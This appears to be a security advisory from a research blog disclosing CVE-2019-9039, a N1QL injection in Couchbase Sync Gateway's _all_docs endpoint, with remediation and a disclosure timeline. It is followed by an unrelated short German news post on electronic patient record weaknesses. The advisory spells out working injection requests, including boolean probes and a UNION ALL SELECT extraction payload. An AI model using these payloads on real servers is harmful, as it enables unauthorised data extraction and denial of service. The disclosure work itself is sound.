[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039

Von [Denis Werner](https://research.hisolutions.com/author/denisw/)[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

## Autor

* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")

  Advisories/Disclosure

  [Alle Beiträge ansehen](https://research.hisolutions.com/author/denisw/ "Alle Beiträge ansehen")

 [Advisory](https://research.hisolutions.com/tag/advisory/)[Couchbase](https://research.hisolutions.com/tag/couchbase/)[CVE](https://research.hisolutions.com/tag/cve/)[CVE-2019-9039](https://research.hisolutions.com/tag/cve-2019-9039/)[Disclosure](https://research.hisolutions.com/tag/disclosure/)[Injection](https://research.hisolutions.com/tag/injection/)[NoSQL](https://research.hisolutions.com/tag/nosql/)

## Beitragsnavigation

[Web vulnerabilities are coming to the Desktop – Template Injections lead to RCE in Teamwire](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/)[Ich Cyberwar’s nicht: US-Offensivmaßnahmen gegen Grids werden verschärft](https://research.hisolutions.com/2019/06/ich-cyberwars-nicht-us-offensivmassnahmen-gegen-grids-werden-verschaerft/)

### Ein Gedanke zu „N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039“

1. Pingback: [CVE-2019-9039 - CVE.report](https://cve.report/CVE-2019-9039)

Kommentare sind geschlossen.

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_06e1d5ec_20250121_012503.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Elektronische Patientenakte (ePA): nicht so sicher

Von [Holger von Rhein](https://research.hisolutions.com/author/holger/)[16. Januar 202516. Januar 2025](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)[News](https://research.hisolutions.com/category/news/)
![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)

Die elektronische Patientenakte (ePA) soll Anfang 2025 in Deutschland flächendeckend eingeführt werden. Damit erhalten alle gesetzlich Versicherten automatisch eine ePA, sofern sie nicht widersprechen.

Martin Tschirsich und Bianca Kastl zeigten auf dem 38C3 jedoch auf, dass u. a. durch Fehlverhalten von Versicherern und/oder Ärzten bzw. deren Mitarbeitenden unberechtigte Dritte vollen Zugriff auf die Patientenakten einzelner Versicherter erhalten können. Dazu gehörten der Weiterverkauf von Konnektoren/Lesegeräten mit noch gestecktem elektronischen Heilberufsausweis (eHBA) oder Institutionsausweis (SMC-B) sowie der Versand eines eHBA durch Dienstleister oder einer eGK durch Versicherungen an eine fremde Adresse.

Solange solche Angriffsvektoren nicht ausreichend adressiert werden, werden die Stimmen, die vor einer Einführung warnen, laut bleiben.

<https://aerzteblatt.de/nachrichten/156770/Aerzte-sorgen-sich-um-Datenschutz-bei-elektronischer-Patientenakte>

<https://bvkj.de/politik-und-presse/pressemitteilung/schwachstellen-in-der-epa-bvkj-fordert-datensicherheit-fuer-kinder-und-jugendliche/>

<https://heise.de/news/Kurz-vor-Start-Immer-mehr-Experten-warnen-vor-elektronischer-Patientenakte-10235091.html>

## Autor

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")

  Kryptographie

  [Alle Beiträge ansehen](https://research.hisolutions.com/author/holger/ "Alle Beiträge ansehen")

## Beitragsnavigation

[Wie funktioniert eigentlich Malware auf Handys?](https://research.hisolutions.com/2025/01/wie-funktioniert-eigentlich-malware-auf-handys/)[Freigiebiger Datenreichtum bei VW](https://research.hisolutions.com/2025/01/freigiebiger-datenreichtum-bei-vw/)

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
